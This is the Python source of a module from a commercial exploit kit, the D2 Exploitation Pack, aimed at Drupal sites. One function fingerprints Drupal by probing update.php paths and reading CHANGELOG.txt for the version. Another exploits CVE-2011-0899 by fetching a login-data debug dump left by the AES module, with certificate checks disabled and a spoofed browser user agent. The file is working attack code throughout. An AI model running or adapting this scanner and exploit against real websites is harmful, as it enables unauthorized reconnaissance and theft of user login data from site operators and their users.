#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#

import sys, os, re, string
try:
  import pycurl
  import StringIO
except ImportError, e:
  print ' %s' % e

def fingerprint(host, port, https, base, webhost):
  dirs = ['', 'cms', 'drupal']
  regs = ['drupal', 'Drupal', 'Access denied']
  nfo = []
  content = StringIO.StringIO()
  c = None
  proto = 'http'
  if https == 1:
    proto = 'https' 
  try:
    c = pycurl.Curl()
    c.setopt(c.TIMEOUT, 15)
    c.setopt(c.FOLLOWLOCATION, 15)
    c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
    if webhost:
      c.setopt(c.HTTPHEADER, ['Host: %s' % webhost])
    if proto == 'https':
      c.setopt(c.SSL_VERIFYPEER, 0)
      c.setopt(c.SSL_VERIFYHOST, 0)
    for d in dirs:
      try:
        c.setopt(pycurl.URL, '%s://%s:%d/%s/update.php' % (proto, host, port, os.path.join(base, d)))
        c.setopt(c.WRITEFUNCTION, content.write)
        c.perform()
        data = content.getvalue()
        for reg in regs:
          drupal = re.findall(reg, data, re.DOTALL)
          if drupal:
            nfo.append('[D2] Drupal found (%s://%s:%d/%s/)' % (proto, host, port, os.path.join(base, d)))
            c.setopt(pycurl.URL, '%s://%s:%d/CHANGELOG.txt' % (proto, host, port))
            c.perform()
            data = content.getvalue()
            ver = re.findall('Drupal [0-9].[0-9][0-9]', data, re.DOTALL)
            if len(ver) and ver[0]:
              nfo.append('[D2] Version: %s' % ver[0])
            c.close()
            return nfo
      except Exception, e:
        nfo.append('[D2] %s' % e)
        return nfo
  except Exception, e:
    nfo.append('[D2] %s' % e)
    return nfo
  c.close()

def cve_2011_0899(host, port, https, base, webhost):
  debug = 'login_edit_dump.txt'
  content = StringIO.StringIO()
  proto = 'http'
  nfo = []
  if https == 1:
    proto = 'https'
  try:
    c = pycurl.Curl()
    c.setopt(pycurl.URL, '%s://%s:%d/%s/%s' % (proto, host, port, base, debug))
    if webhost:
      c.setopt(c.HTTPHEADER, ['Host: %s' % webhost])
    #c.setopt(c.FOLLOWLOCATION, 15)
    c.setopt(c.WRITEFUNCTION, content.write)
    c.setopt(c.TIMEOUT, 15)
    if proto == 'https':
      c.setopt(c.SSL_VERIFYPEER, 0)
      c.setopt(c.SSL_VERIFYHOST, 0)
    c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
    c.perform()
  except Exception, e:
    return '[D2] %s' % e
  status = c.getinfo(c.HTTP_CODE) 
  if status == 200:
    nfo.append(content.getvalue())
  else:
    nfo.append('[D2] Not vulnerable to cve_2011_0899 (aes module)')
  c.close()
  return nfo
